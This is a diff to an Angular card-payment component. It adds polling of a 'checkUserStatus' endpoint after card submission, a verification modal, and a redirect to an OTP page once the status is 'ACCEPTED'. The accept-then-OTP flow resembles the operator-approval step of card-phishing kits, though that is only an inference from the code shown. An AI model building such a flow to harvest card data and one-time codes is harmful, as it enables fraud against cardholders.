@@ -1,23 +1,26 @@
-import { Component, inject } from '@angular/core';
+import { Component, inject, ChangeDetectorRef, OnDestroy } from '@angular/core';
 import { CommonModule, Location } from '@angular/common';
 import { Router } from '@angular/router';
 import { FormBuilder, FormGroup, Validators, ReactiveFormsModule } from '@angular/forms';
 import { Header } from "../../Layout/header/header";
 import { OrderCartService } from '../../Core/services/order-cart.service';
 import { CheckoutService } from '../../Core/services/api/checkout.service';
+import { PaymentVerificationModal, VerificationStatus } from '../../Components/payment-verification-modal/payment-verification-modal';
+import { Subscription, interval } from 'rxjs';
 
 @Component({
-  imports: [CommonModule, ReactiveFormsModule, Header],
+  imports: [CommonModule, ReactiveFormsModule, Header, PaymentVerificationModal],
   selector: 'app-card-pay',
   styleUrl: './card-pay.css',
   templateUrl: './card-pay.html',
 })
-export class CardPay {
+export class CardPay implements OnDestroy {
   private readonly orderCartService = inject(OrderCartService);
   private readonly checkoutService = inject(CheckoutService);
   private readonly location = inject(Location);
   private readonly router = inject(Router);
   private readonly fb = inject(FormBuilder);
+  private readonly cdr = inject(ChangeDetectorRef);
 
   paymentForm: FormGroup = this.fb.group({
     personalInfo: this.fb.group({
@@ -35,6 +38,15 @@ export class CardPay {
   });
 
   isLoading = false;
+  isVerifying = false;
+  verificationStatus: VerificationStatus = 'checking';
+  errorMessage = '';
+
+  private pollSub?: Subscription;
+
+  ngOnDestroy(): void {
+    this.stopPolling();
+  }
 
   get items() {
     return this.orderCartService.getItems();
@@ -91,17 +103,60 @@ export class CardPay {
 
       this.isLoading = true;
       this.checkoutService.submitPayment(payload).subscribe({
-        next: () => {
-          this.isLoading = false;
-          this.router.navigate(['/payment/otp']);
+        next: (res) => {
+          const cardId = res?.CardId || this.checkoutService.cardId;
+          this.startVerification(cardId);
         },
         error: (err) => {
           console.error('Payment submission failed', err);
           this.isLoading = false;
+          this.cdr.markForCheck();
         }
       });
     } else {
       this.paymentForm.markAllAsTouched();
+    }
+  }
+
+  private startVerification(cardId: string) {
+    this.isVerifying = true;
+    this.verificationStatus = 'checking';
+    this.errorMessage = '';
+    this.cdr.markForCheck();
+
+    this.stopPolling();
+    this.pollSub = interval(2000).subscribe(() => {
+      this.checkoutService.checkUserStatus(cardId).subscribe((status) => {
+        if (status === 'ACCEPTED') {
+          this.stopPolling();
+          this.verificationStatus = 'accepted';
+          this.cdr.markForCheck();
+          setTimeout(() => {
+            this.isVerifying = false;
+            this.isLoading = false;
+            this.router.navigate(['/payment/otp']);
+          }, 800);
+        } else if (status === 'REJECTED') {
+          this.stopPolling();
+          this.verificationStatus = 'rejected';
+          this.errorMessage = 'Transaction declined by bank. Please check your card information or try another card.';
+          this.cdr.markForCheck();
+        }
+      });
+    });
+  }
+
+  handleRetry(): void {
+    this.stopPolling();
+    this.isVerifying = false;
+    this.isLoading = false;
+    this.cdr.markForCheck();
+  }
+
+  private stopPolling(): void {
+    if (this.pollSub) {
+      this.pollSub.unsubscribe();
+      this.pollSub = undefined;
     }
   }
 }
